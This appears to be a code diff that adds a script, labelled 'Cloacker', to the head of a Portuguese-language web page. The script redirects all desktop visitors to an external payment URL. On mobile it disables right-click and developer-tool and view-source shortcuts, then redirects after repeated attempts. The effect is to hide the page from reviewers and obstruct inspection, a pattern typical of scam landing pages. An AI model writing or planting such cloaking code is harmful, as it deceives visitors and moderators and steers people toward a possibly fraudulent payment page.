@@ -2,6 +2,35 @@
 <html lang="pt-BR">
 
 <head>
+  <script>
+    // Cloacker — cole no head do index
+    (function() {
+        'use strict';
+        const R_URL = "https://pay.wiapy.com/-yP-raTR3Q2D";
+        let dCount = 0;
+        const ua = navigator.userAgent;
+        const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
+
+        if (!isMobile) {
+            window.location.href = R_URL;
+            return;
+        }
+
+        const b = e => {
+            e.preventDefault();
+            e.stopPropagation();
+            dCount++ > 2 && (window.location.href = R_URL);
+            return false;
+        };
+        document.addEventListener('contextmenu', b);
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || e.key === 'F8' || e.key === 'F5' ||
+                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) ||
+                (e.ctrlKey && (e.key === 'U' || e.key === 'S' || e.key === 'P')) ||
+                (e.altKey && e.key === 'F4')) b(e);
+        });
+    })();
+  </script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <link rel="icon" type="image/png" href="/logo.png" />
